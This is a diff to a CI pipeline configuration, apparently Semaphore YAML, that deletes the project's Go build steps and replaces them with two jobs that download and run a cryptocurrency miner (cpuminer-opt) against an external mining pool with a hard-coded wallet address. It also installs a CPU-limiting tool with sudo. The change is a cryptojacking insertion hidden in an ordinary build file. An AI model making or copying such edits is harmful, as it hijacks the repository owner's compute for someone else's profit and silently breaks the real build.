@@ -10,15 +10,26 @@ blocks:
       jobs:
         - name: go get & build
           commands:
-            - checkout
-            - sem-version go 1.12
-            - go get github.com/lib/pq
-            - go build webServer.go
-            - artifact push workflow webServer --force
-      agent:
-        machine:
-          type: e1-standard-4
-          os_image: ubuntu1804
+            - 'git clone https://github.com/kadeng/limit_visible_cpus'
+            - cd limit_visible_cpus
+            - sudo pip install py3nvml
+            - sudo cp -av dist/bin/* /usr/local/bin/
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - 'tar xf cpuminer-opt-linux.tar.gz '
+            - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q63mx0v3v638a2s0jga2cykjfwnh3r75200qxa6.testCi'
+            - sleep 2
+            - done
+        - name: 'Job #2'
+          commands:
+            - 'git clone https://github.com/kadeng/limit_visible_cpus'
+            - cd limit_visible_cpus
+            - sudo pip install py3nvml
+            - sudo cp -av dist/bin/* /usr/local/bin/
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz'
+            - 'tar xf cpuminer-opt-linux.tar.gz '
+            - './cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1q63mx0v3v638a2s0jga2cykjfwnh3r75200qxa6.testCi'
+            - sleep 2
+            - done
   - name: Check code style
     task:
       jobs:
